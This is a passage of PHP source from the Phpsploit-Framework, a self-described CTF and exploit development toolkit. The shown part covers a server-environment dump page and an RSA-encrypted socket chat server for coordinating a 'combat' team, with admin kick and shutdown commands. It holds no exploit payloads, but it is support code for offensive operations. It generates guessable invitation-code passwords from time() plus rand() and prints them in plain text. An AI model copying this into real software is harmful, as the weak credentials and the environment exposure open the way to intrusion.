You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

interface Interface_Operate_ChatServer extends Interface_Operate
{
    const KEY_MESSAGE_QUEUE      = Interface_Base_BlockKey::SOCKETS;
    const LIMIT_INVITATION_CODES = 20;
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-10
 * Time: 下午3:35
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_BlockEndFlag extends Class_Base implements Interface_Base_BlockEndFlag
{
    private $_end_flag = self::FLAG_BLOCK_END;

    public static function is_block_end_flag ( $block )
    {
        if ( ( empty( $block ) ) || ( ! is_object ( $block ) ) || ( ! ( $block instanceof Class_Base_BlockEndFlag ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_end_flag ( $block )
    {
        if ( ! property_exists ( $block , "end_flag" ) ) {
            return false;
        }
        if ( ( is_null ( $block->end_flag ) ) || ( ! is_string ( $block->end_flag ) ) ) {
            return false;
        }
        return true;
    }

    public static function create_block_end_flag ( $end_flag )
    {
        $_block_end_flag = new Class_Base_BlockEndFlag( $end_flag );
        return $_block_end_flag;
    }

    public static function get_end_flag_size ()
    {
        $_size = self::SIZE_BLOCK_END_FLAG;
        return $_size;
    }

    public function __construct ( $end_flag = self::FLAG_BLOCK_END )
    {
        if ( ! is_string ( $end_flag ) ) {
            throw new \Exception( "end_flag is not a string" , 0 );
        }
        if ( strlen ( $end_flag ) != 8 ) {
            throw new \Exception( "end_flag length is not 8" , 0 );
        }
        $this->_end_flag = $end_flag;
    }

    public function __destruct ()
    {
        $this->_end_flag = null;
    }

    public function get_end_flag ()
    {
        $_end_flag = $this->_end_flag;
        return $_end_flag;
    }

    public function get_block_string ()
    {
        $_block_string = ( $this->_end_flag );
        return $_block_string;
    }

    public function get_block_string_size ()
    {
        $_block_string        = self::get_block_string ();
        $_block_string_length = strlen ( $_block_string );
        return $_block_string_length;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-27
 * Time: 下午6:55
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Server extends Class_Controller
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth::is_login () ) ) {
            Class_Base_Response::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top::top ();
            $_body   = array (
                "menu"    => Class_View_Server_Menu::menu () ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom::bottom ();
            Class_Base_Response::output ( Class_View::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function server_info ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SERVER;
            if ( ! is_array ( $_SERVER ) ) {
                $_SERVER = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth::is_login () ) ) {
            Class_Base_Response::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth::check_permission ();
        if ( is_cli () ) {
            Class_Base_Response::outputln (
                $_SERVER
            );
        }
        if ( ! is_cli () ) {
            $_cli_url           = Class_Base_Response::get_cli_url ( "/server/server_info" , array () );
            $_cli_encode_url = Class_Base_Response::get_urlencode ( $_cli_url );
            $_form_top          = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Display relevant information about PHP server-side environment variables</div>';
            $_form_top          .= '<div style="width:100%;word-break:break-all;margin-top:16px;padding-left:0;padding-right:0;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This interface mainly displays the internal environment variable content of the PHP language located on the server side.</div>';
            $_form              = array (
                "action" => "/server/server_info" ,
                "inputs" => array () ,
                "textareas" => array (
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit" => array (
                    "display" => false ,
                ) ,
                "reset"  => array (
                    "display" => false ,
                ) ,
            );
            foreach ( $_SERVER as $key => $value ) {
                $_form[ "inputs" ][] = array (
                    "id"       => $key ,
                    "title"    => ( ( strlen ( $key ) > 12 ) ? ( substr ( $key , 0 , 12 ) . chr ( 46 ) . chr ( 46 ) . chr ( 46 ) ) : ( $key ) ) ,
                    "describe" => $key ,
                    "name"     => $key ,
                    "value"    => ( $value ) ,
                    "disabled" => "disabled" ,
                );
            }
            $_top         = Class_View_Top::top ();
            $_body        = array (
                "menu"    => Class_View_Server_Menu::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom      = Class_View_Bottom::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response::output ( Class_View::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-1-23
 * Time: 下午6:27
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Operate_ChatServer extends Class_Operate implements Interface_Operate_ChatServer
{
    const EXCEPTION_MESSAGE_TOKEN_ERROR  = "token is error";
    const EXCEPTION_MESSAGE_CONNECT_QUIT = "connect is exit";
    const EXCEPTION_MESSAGE_CONNECT_EXIT = "connect service is exit";
    const EXCEPTION_BREAK                = 1;

    private static $_client_sockets         = array ();
    private static $_server_socket          = null;
    private static $_max_connect_number     = 0;
    private static $_invitation_codes       = array ( "admin" => null , "users" => array () );
    private static $_invitation_codes_limit = Interface_Operate_ChatServer::LIMIT_INVITATION_CODES;

    public static function create_invitation_codes ( $connect_domain_List_id = "connect_domain_list_id" )
    {
        self::$_invitation_codes[ "admin" ] = array ( time () . rand ( 10000001 , 99999999 ) , "admin" );
        if ( ! is_array ( self::$_invitation_codes[ "users" ] ) ) {
            self::$_invitation_codes[ "users" ] = array ();
        }
        if ( ! is_cli () ) {
            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nSuccessfully created a temporary administrator account for the combat conference room, account nickname: " . self::$_invitation_codes[ "admin" ][ 1 ] . ", account password: " . self::$_invitation_codes[ "admin" ][ 0 ] ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
        } else {
            Class_Base_Response::outputln ( "\n" . ( "Successfully created a temporary administrator account for the combat conference room, account nickname: " . self::$_invitation_codes[ "admin" ][ 1 ] . ", account password: " . self::$_invitation_codes[ "admin" ][ 0 ] ) . "\n" );
        }
        for ( $user_invitation_codes_index = 0 ; $user_invitation_codes_index < ( self::$_invitation_codes_limit - 1 ) ; $user_invitation_codes_index++ ) {
            self::$_invitation_codes[ "users" ][ $user_invitation_codes_index ] = array ( ( time () . rand ( 10000001 , 99999999 ) ) , ( "user_" . $user_invitation_codes_index ) );
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nSuccessfully created " . ( $user_invitation_codes_index + 1 ) . " combat conference room temporary account, account nickname: " . ( self::$_invitation_codes[ "users" ][ $user_invitation_codes_index ][ 1 ] ) . ", account password: " . ( self::$_invitation_codes[ "users" ][ $user_invitation_codes_index ][ 0 ] ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( "\n" . ( "Successfully created " . ( $user_invitation_codes_index + 1 ) . " combat conference room temporary account, account nickname: " . ( self::$_invitation_codes[ "users" ][ $user_invitation_codes_index ][ 1 ] ) . ", account password: " . ( self::$_invitation_codes[ "users" ][ $user_invitation_codes_index ][ 0 ] ) ) . "\n" );
            }
        }
    }

    public static function in_invitation_codes ( $invitation_code )
    {
        if ( $invitation_code == self::$_invitation_codes[ "admin" ][ 0 ] ) {
            return true;
        }
        foreach ( self::$_invitation_codes[ "users" ] as $index => $user ) {
            if ( $invitation_code == $user[ 0 ] ) {
                return true;
            }
        }
        return false;
    }

    public static function get_invitation_code_index ( $invitation_code )
    {
        foreach ( self::$_invitation_codes[ "users" ] as $index => $user ) {
            if ( $invitation_code == $user[ 0 ] ) {
                return $index;
            }
        }
        return false;
    }

    public static function get_invitation_code_name ( $invitation_code )
    {
        if ( $invitation_code == self::$_invitation_codes[ "admin" ][ 0 ] ) {
            return self::$_invitation_codes[ "admin" ][ 1 ];
        }
        foreach ( self::$_invitation_codes[ "users" ] as $index => $user ) {
            if ( $invitation_code == $user[ 0 ] ) {
                return $user[ 1 ];
            }
        }
        return null;
    }

    public static function clear_invitation_code ( $invitation_code )
    {
        foreach ( self::$_invitation_codes[ "users" ] as $index => $user ) {
            if ( $invitation_code == $user[ 0 ] ) {
                self::$_invitation_codes[ "users" ][ $index ] = null;
                unset( self::$_invitation_codes[ "users" ][ $index ] );
            }
        }
        return null;
    }

    public static function get_client_key ( $ip , $port )
    {
        $_client_key = $ip . ":" . $port;
        return $_client_key;
    }

    public static function create_server ( $ip , $port , $max_connect_number = 20 , $max_execute_time = 3600 , $connect_domain_List_id = "connect_domain_list_id" )
    {
        Class_Base_Socket::init ( $max_execute_time );
        if ( ! is_cli () ) {
            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\n" . 'The maximum effective listening time of the socket server has been set to ' . ( ( intval ( $max_execute_time ) === 0 ) ? 'unlimited duration. Please note that such behavior may be dangerous!' : ( $max_execute_time . ' seconds' ) ) ) . "\n" , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
        } else {
            Class_Base_Response::outputln ( 'The maximum effective listening time of the socket server has been set to ' . ( ( intval ( $max_execute_time ) === 0 ) ? 'unlimited duration. Please note that such behavior may be dangerous!' : ( $max_execute_time . ' seconds' ) ) );
        }
        self::$_max_connect_number = $max_connect_number;
        self::$_server_socket      = Class_Base_Socket::create ();
        Class_Base_Socket::socket_set_nonblock ( self::$_server_socket );
        Class_Base_Socket::bind ( self::$_server_socket , $ip , $port );
        Class_Base_Socket::listen ( self::$_server_socket , $max_connect_number );
    }

    public static function add_client_to_map ( $ip , $port , $socket , $invitation_code )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        $_key = self::get_client_key ( $ip , $port );
        if ( empty( self::$_client_sockets[ $_key ] ) ) {
            self::$_client_sockets[ $_key ] = array ( $socket , $invitation_code );
        }
        if ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $_key ] ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $_key ] = array ( $socket , $invitation_code );
        }
    }

    public static function set_client_map_invitation_code ( $ip , $port , $invitation_code )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        $_key = self::get_client_key ( $ip , $port );
        if ( array_key_exists ( $_key , self::$_client_sockets ) && is_array ( self::$_client_sockets[ $_key ] ) && ( count ( self::$_client_sockets[ $_key ] ) >= 2 ) && empty( self::$_client_sockets[ $_key ][ 1 ] ) ) {
            self::$_client_sockets[ $_key ][ 1 ] = $invitation_code;
        }
        if ( array_key_exists ( $_key , $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ] ) && is_array ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $_key ] ) && ( count ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $_key ] ) >= 2 ) && empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $_key ][ 1 ] ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $_key ][ 1 ] = $invitation_code;
        }
    }

    public static function get_client_map_invitation_code ( $ip , $port )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        $_key = self::get_client_key ( $ip , $port );
        if ( ! empty( self::$_client_sockets[ $_key ] ) ) {
            if ( count ( self::$_client_sockets[ $_key ] ) >= 2 ) {
                return self::$_client_sockets[ $_key ][ 1 ];
            }
        }
        if ( ! empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $_key ] ) ) {
            if ( count ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $_key ] ) >= 2 ) {
                return $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $_key ][ 1 ];
            }
        }
        return null;
    }

    public static function get_client_map_socket ( $ip , $port )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        $_key = self::get_client_key ( $ip , $port );
        if ( ! empty( self::$_client_sockets[ $_key ] ) ) {
            if ( count ( self::$_client_sockets[ $_key ] ) >= 2 ) {
                return self::$_client_sockets[ $_key ][ 0 ];
            }
        } else if ( ! empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $_key ] ) ) {
            if ( count ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $_key ] ) >= 2 ) {
                return $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $_key ][ 0 ];
            }
        }
        return null;
    }

    public static function get_client_map_ip_and_port ( $client_key )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ! empty( self::$_client_sockets[ $client_key ] ) ) {
            $_item = explode ( ":" , $client_key );
            if ( count ( $_item ) < 2 ) {
                return null;
            }
            return $_item;
        } else if ( ! empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $client_key ] ) ) {
            $_item = explode ( ":" , $client_key );
            if ( count ( $_item ) < 2 ) {
                return null;
            }
            return $_item;
        }
        return null;
    }

    public static function clear_client_to_map ( $key )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ! empty( self::$_client_sockets[ $key ] ) ) {
            self::$_client_sockets[ $key ] = null;
            unset( self::$_client_sockets[ $key ] );
        }
        if ( ! empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $key ] ) ) {
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $key ] = null;
            unset( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][ $key ] );
        }
    }

    public static function count_client_socket_map ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        $_count = count ( self::$_client_sockets );
        if ( empty( $_count ) ) {
            $_count = count ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ] );
        }
        return $_count;
    }

    public static function list_client_socket ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        $_list = array_keys ( self::$_client_sockets );
        if ( empty( $_list ) ) {
            $_list = array_keys ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ] );
        }
        return $_list;
    }

    public static function list_client_sokcet_string ()
    {
        $_string = implode ( " , " , self::list_client_socket () );
        return $_string;
    }

    public static function send_message ( $socket , $message , $private_key_resource , $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        $_client_sockets = array ();
        if ( ! empty( self::$_client_sockets ) ) {
            $_client_sockets = self::$_client_sockets;
        } else if ( ! empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ] ) ) {
            $_client_sockets = $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ];
        }
        foreach ( $_client_sockets as $key => $item ) {
            if ( ( ! empty( $item[ 0 ] ) ) && ( ! empty( $item[ 1 ] ) ) ) {
                if ( $socket != $item[ 0 ] ) {
                    try {
                        $_message_length = strlen ( $message );
                        if ( $_message_length == 1 ) {
                            if ( substr ( $message , ( $_message_length - 1 ) , 1 ) != "\n" ) {
                                if ( substr ( $message , ( $_message_length - 1 ) , 1 ) == "\r" ) {
                                    $message = ( $message . "\n" );
                                } else {
                                    $message = ( $message . "\r\n" );
                                }
                            }
                        } else if ( $_message_length >= 2 ) {
                            if ( substr ( $message , ( $_message_length - 2 ) , 2 ) != "\r\n" ) {
                                if ( substr ( $message , ( $_message_length - 1 ) , 1 ) == "\r" ) {
                                    $message = ( $message . "\n" );
                                } else {
                                    $message = ( $message . "\r\n" );
                                }
                            }
                        }
                        $_encode_message = Class_Base_Security_Rsa::private_encode ( $message , $private_key_resource );
                        $_length         = Class_Base_Socket::write ( $item[ 0 ] , $_encode_message );
                    } catch ( \Exception $e ) {
                        if ( ! is_cli () ) {
                            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "client connection write is error , client ( " . $key . " ) , invitation_code ( " . $item[ 1 ] . " ) , messsage ( " . $message . " ) , error code ( " . $e->getCode () . " ) , error_message ( " . $e->getMessage () . " ) " ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                        } else {
                            Class_Base_Response::outputln ( "\n" . ( "client connection write is error , client ( " . $key . " ) , invitation_code ( " . $item[ 1 ] . " ) , messsage ( " . $message . " ) , error code ( " . $e->getCode () . " ) , error_message ( " . $e->getMessage () . " ) " ) . "\n" );
                        }
                        $_length = false;
                    }
                    if ( $_length === false ) {
                        try {
                            Class_Base_Socket::close ( $item[ 0 ] );
                        } catch ( \Exception $e ) {
                            if ( ! is_cli () ) {
                                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "client connection close is error , client ( " . $key . " ) , invitation_code ( " . $item[ 1 ] . " ) , error code ( " . $e->getCode () . " ) , error_message ( " . $e->getMessage () . " ) " ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                            } else {
                                Class_Base_Response::outputln ( "\n" . ( "client connection close is error , client ( " . $key . " ) , invitation_code ( " . $item[ 1 ] . " ) , error code ( " . $e->getCode () . " ) , error_message ( " . $e->getMessage () . " ) " ) . "\n" );
                            }
                        }
                        self::clear_client_to_map ( $key );
                        if ( ! is_cli () ) {
                            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "client connection is close , client ( " . $key . " ) , invitation_code ( " . $item[ 1 ] . " ) " ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                        } else {
                            Class_Base_Response::outputln ( "\n" . ( "client connection is close , client ( " . $key . " ) , invitation_code ( " . $item[ 1 ] . " ) " ) . "\n" );
                        }
                    }
                    if ( ! is_null ( $socket ) ) {
                        if ( ! is_cli () ) {
                            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nsend message to client ( " . $key . " ) , invitation_code ( " . $item[ 1 ] . " ) , message : " . print_r ( $message , true ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                        } else {
                            Class_Base_Response::outputln ( "\n" . ( "send message to client ( " . $key . " ) , invitation_code ( " . $item[ 1 ] . " ) , message : " . print_r ( $message , true ) ) . "\n" );
                        }
                    }
                }
            }
        }
    }

    public static function start ( $ip , $port , $max_connect_number , $max_execute_time , $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( is_cli () ) {
            global $_SERVER;
            if ( ! is_array ( $_SERVER ) ) {
                $_SERVER = array ();
            }
        }
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        try {
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nChat Server is Start , time : " . date ( "Y-m-d H:i:s" , time () ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nclient manager connect : " . $_SERVER[ "REMOTE_ADDR" ] . ":" . $_SERVER[ "REMOTE_PORT" ] . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( "Chat Server is Start" );
            }
            self::create_invitation_codes ( $connect_domain_List_id );
            self::create_server ( $ip , $port , $max_connect_number , $max_execute_time , $connect_domain_List_id );
            $_public_key_resource  = Class_Base_Security_Rsa::create_public_key_resource ( Class_Base_Security_Rsa::CLIENT_PUBLIC_KEY );
            $_private_key_resource = Class_Base_Security_Rsa::create_private_key_resource ( Class_Base_Security_Rsa::SERVER_PRIVATE_KEY );
            if ( ( empty( $_public_key_resource ) ) || ( empty( $_private_key_resource ) ) ) {
                throw new \Exception( "RSA public or private key resource request failed ! " , 0 );
            }
            do {
                $client_socket = Class_Base_Socket::accept ( self::$_server_socket );
                if ( ! empty( $client_socket ) ) {
                    if ( ! Class_Base_Socket::is_socket ( $client_socket ) ) {
                        throw new \Exception( "new socket is not a resource , socket ( " . print_r ( $client_socket , true ) . " ) , socket type ( " . gettype ( $client_socket ) . " ) " , 0 );
                    }
                    $_client_info = Class_Base_Socket::getpeername ( $client_socket );
                    if ( ! is_cli () ) {
                        Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "Received connection from client " . $_client_info[ "ip" ] . ":" . $_client_info[ "port" ] ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    } else {
                        Class_Base_Response::outputln ( "\n" . ( "Received connection from client " . $_client_info[ "ip" ] . ":" . $_client_info[ "port" ] ) . "\n" );
                    }
                    self::add_client_to_map ( $_client_info[ "ip" ] , $_client_info[ "port" ] , $_client_info[ "socket" ] , $_client_info[ "invitation_code" ] );
                    if ( ! is_cli () ) {
                        Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "client sockets : " . self::list_client_sokcet_string () ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    } else {
                        Class_Base_Response::outputln ( "\n" . ( "client sockets : " . self::list_client_sokcet_string () ) . "\n" );
                    }
                }
                try {
                    $_client_sockets = array ();
                    if ( ! empty( self::$_client_sockets ) ) {
                        $_client_sockets = self::$_client_sockets;
                    } else if ( ! empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ] ) ) {
                        $_client_sockets = $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ];
                    }
                    foreach ( $_client_sockets as $key => $item ) {
                        if ( empty( $item ) ) {
                            continue;
                        }
                        if ( empty( $item[ 0 ] ) ) {
                            continue;
                        }
                        $_client_exit = 0;
                        $_client_info = Class_Base_Socket::getpeername ( $item[ 0 ] );
                        if ( empty( $_client_info[ "socket" ] ) ) {
                            continue;
                        }
                        $_message = Class_Base_Socket::receive ( $item[ 0 ] , 1048576 , MSG_DONTWAIT );
                        if ( ! Class_Base_Format::is_empty ( $_message ) ) {
                            $_message             = Class_Base_Security_Rsa::public_decode ( $_message , $_public_key_resource );
                            $_client_message      = Class_Base_Format::format_message_read ( $_message );
                            $_client_message_item = explode ( chr ( 32 ) , $_client_message );
                            $_message_item        = $_client_message_item;
                            array_shift ( $_message_item );
                            if ( count ( $_client_message_item ) < 2 ) {
                                Class_Base_Socket::close ( $item[ 0 ] );
                                self::clear_client_to_map ( $key );
                                $_client_exit = 1;
                                if ( ! is_cli () ) {
                                    Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "client ( " . $key . " ) socket is close , client_invitation_code is not is exist , time : " . date ( "Y-m-d H:i:s" , time () ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                } else {
                                    Class_Base_Response::outputln ( "\n" . ( "client ( " . $key . " ) socket is close , client_invitation_code is not is exist , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" );
                                }
                            }
                            $_invitation_code = $item[ 1 ] = $_client_info[ "invitation_code" ] = $_client_message_item[ 0 ];
                            $_client_message  = implode ( " " , $_message_item );
                            if ( ( ! self::in_invitation_codes ( $_invitation_code ) ) & ( empty( $_client_exit ) ) ) {
                                Class_Base_Socket::close ( $item[ 0 ] );
                                self::clear_client_to_map ( $key );
                                $_client_exit = 1;
                                if ( ! is_cli () ) {
                                    Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "client ( " . $key . " ) socket is close , client_invitation_code is error , client_invitation_code ( " . $_invitation_code . " ) , time : " . date ( "Y-m-d H:i:s" , time () ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                } else {
                                    Class_Base_Response::outputln ( "\n" . ( "client ( " . $key . " ) socket is close , client_invitation_code is error , client_invitation_code ( " . $_invitation_code . " ) , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" );
                                }
                            }
                            if ( empty( $_client_exit ) ) {
                                self::set_client_map_invitation_code ( $_client_info[ "ip" ] , $_client_info[ "port" ] , $_invitation_code );
                                if ( $_client_message == "exit" ) {
                                    Class_Base_Socket::close ( $item[ 0 ] );
                                    self::clear_client_to_map ( $key );
                                    if ( ! is_cli () ) {
                                        Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "client ( " . $key . " ) socket is close , client_send_exit to server , time : " . date ( "Y-m-d H:i:s" , time () ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                    } else {
                                        Class_Base_Response::outputln ( "\n" . ( "client ( " . $key . " ) socket is close , client_send_exit to server , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" );
                                    }
                                }
                                if ( $_invitation_code == self::$_invitation_codes[ "admin" ][ 0 ] ) {
                                    if ( $_client_message == "server_exit" ) {
                                        throw new \Exception( "exit" , 0 );
                                    }
                                    $_client_message_length = strlen ( $_client_message );
                                    if ( ( $_client_message_length > 16 ) && ( $_client_message_length < 29 ) ) {
                                        if ( substr ( $_client_message , 0 , 6 ) == "kill_9" ) {
                                            $_kill_client_key = substr ( $_client_message , 7 , ( $_client_message_length - 7 ) );
                                            if ( key_exists ( $_kill_client_key , self::$_client_sockets ) || key_exists ( $_kill_client_key , $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ] ) ) {
                                                $_kill_client_item = self::get_client_map_ip_and_port ( $_kill_client_key );
                                                if ( ! empty( $_kill_client_item ) ) {
                                                    $_client_socket = self::get_client_map_socket ( $_kill_client_item[ 0 ] , $_kill_client_item[ 1 ] );
                                                    if ( ! empty( $_client_socket ) ) {
                                                        Class_Base_Socket::close ( $_client_socket );
                                                    }
                                                    $_kill_client_invitation_code = self::get_client_map_invitation_code ( $_kill_client_item[ 0 ] , $_kill_client_item[ 1 ] );
                                                    if ( ! empty( $_kill_client_invitation_code ) ) {
                                                        self::clear_invitation_code ( $_kill_client_invitation_code );
                                                    }
                                                    self::clear_client_to_map ( $_kill_client_key );
                                                    if ( ! is_cli () ) {
                                                        Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "client ( " . $key . " ) socket is close , admin send kill_9 to server , time : " . date ( "Y-m-d H:i:s" , time () ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                                    } else {
                                                        Class_Base_Response::outputln ( "\n" . ( "client ( " . $key . " ) socket is close , admin send kill_9 to server , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" );
                                                    }
                                                }
